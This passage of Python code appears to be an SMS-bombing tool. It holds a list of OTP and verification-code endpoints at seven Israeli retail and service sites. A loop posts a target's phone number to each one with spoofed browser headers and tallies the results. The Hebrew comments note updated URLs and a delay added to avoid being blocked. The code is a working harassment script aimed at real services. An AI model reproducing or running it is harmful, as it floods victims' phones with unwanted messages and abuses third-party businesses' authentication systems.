apis = [
            {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
            {"n": "Teva Bari", "u": "https://www.tevabari.co.il/index.php", "d": {"username": target, "option": "com_ajax", "plugin": "smsauth", "group": "authentication", "method": "smsauth", "task": "send", "format": "json"}, "type": "form", "ref": "https://www.tevabari.co.il/"},
            {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/verify", "d": {"phone": target, "source": "web"}, "type": "json", "ref": "https://www.mishloha.co.il/"},
            {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
            # פוקס ופוטלוקר עם כתובות מעודכנות
            {"n": "Fox", "u": "https://www.fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.fox.co.il/"},
            {"n": "Foot Locker", "u": "https://www.footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.footlocker.co.il/"},
            {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.laline.co.il/"}
        ]

        for site in apis:
            try:
                h = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Referer": site["ref"],
                    "Origin": site["ref"].rstrip('/'),
                    "Content-Type": "application/json" if site["type"] == "json" else "application/x-www-form-urlencoded",
                    "Accept": "*/*"
                }
                
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=h, timeout=2.0)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=h, timeout=2.0)
                
                # הדפסה ללוגים של Render כדי שתראה מה קורה
                print(f"Site: {site['n']} | Status: {res.status_code} | Response: {res.text[:50]}")
                
                if res.status_code in [200, 201]:
                    success_count += 1
                else:
                    failed_count += 1
                
                time.sleep(0.3) # הגדלתי קצת את הדיליי כדי לא להיחסם
            except Exception as e:
                print(f"Error on {site['n']}: {e}")
                failed_count += 1
